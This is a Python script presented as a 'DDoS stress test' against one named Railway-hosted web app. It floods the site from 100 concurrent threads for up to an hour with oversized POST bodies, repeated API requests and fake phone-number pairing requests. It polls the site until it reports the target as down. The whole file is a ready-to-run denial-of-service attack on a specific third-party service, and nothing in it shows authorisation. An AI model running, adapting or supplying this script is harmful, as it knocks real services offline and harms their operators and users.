#!/usr/bin/env python3
"""
DCT-MD-V7 DDoS Stress Test - Termux Compatible
Target: https://dct-md-v7-production.up.railway.app/

Usage: python3 ddos_dct.py
"""
import requests
import time
import random
import sys
import concurrent.futures
import urllib3
urllib3.disable_warnings()

BASE = "https://dct-md-v7-production.up.railway.app"

stats = {"total": 0, "errors": 0, "timeouts": 0, "success": 0}


def attack():
    global stats
    try:
        vector = random.randint(0, 4)
        if vector == 0:
            requests.post(f"{BASE}/", data="Z" * 500000, timeout=5)
        elif vector == 1:
            requests.get(f"{BASE}/api/stats", timeout=5)
        elif vector == 2:
            requests.get(f"{BASE}/active", timeout=5)
        elif vector == 3:
            requests.post(f"{BASE}/pair",
                json={"number": str(random.randint(100000000, 999999999)), "server": "ams1"},
                timeout=5)
        else:
            requests.post(f"{BASE}/api/stats",
                data="X" * 1000000, timeout=5)
        stats["total"] += 1
    except requests.exceptions.Timeout:
        stats["total"] += 1
        stats["timeouts"] += 1
    except:
        stats["total"] += 1
        stats["errors"] += 1


def check_site():
    try:
        r = requests.get(f"{BASE}/", timeout=8)
        return r.status_code
    except:
        return "DOWN"


def main():
    threads = 100
    
    print("=" * 50)
    print("  DCT-MD-V7 DDOS STRESS TEST")
    print("  Termux Compatible")
    print("=" * 50)
    print(f"  Threads: {threads}")
    print(f"  Target: {BASE}")
    print("=" * 50)
    print()
    
    # Check initial status
    initial = check_site()
    print(f"[*] Initial status: HTTP {initial}")
    print()
    
    start = time.time()
    last_report = start
    last_check = start
    site_down = False
    
    try:
        while time.time() - start < 3600:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
                list(pool.map(lambda _: attack(), range(threads)))
            
            now = time.time()
            elapsed = now - start
            
            if now - last_report > 5:
                rate = stats["total"] / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\r  [T+{elapsed:.0f}s] Requests: {stats['total']} | Errors: {stats['errors']} | Timeouts: {stats['timeouts']} | Rate: {rate:.0f}/s")
                sys.stdout.flush()
                last_report = now
            
            if now - last_check > 20:
                status = check_site()
                print(f"\n  [CHECK T+{elapsed:.0f}s] Site: HTTP {status}")
                if status in ("DOWN", "timeout", 502, 503, 504):
                    print(f"\n  [!!!] SITE IS DOWN after {elapsed:.0f}s!")
                    site_down = True
                    break
                last_check = now
    
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
    
    elapsed = time.time() - start
    rate = stats["total"] / elapsed if elapsed > 0 else 0
    
    print(f"\n\n{'='*50}")
    print(f"  RESULTS")
    print(f"{'='*50}")
    print(f"  Total: {stats['total']}")
    print(f"  Errors: {stats['errors']}")
    print(f"  Timeouts: {stats['timeouts']}")
    print(f"  Rate: {rate:.0f} req/s")
    print(f"  Duration: {elapsed:.0f}s")
    
    final = check_site()
    print(f"  Final: HTTP {final}")
    if final in ("DOWN", "timeout"):
        print(f"\n  [!!!] TARGET DOWN!")
    
    print(f"{'='*50}")


if __name__ == "__main__":
    main()
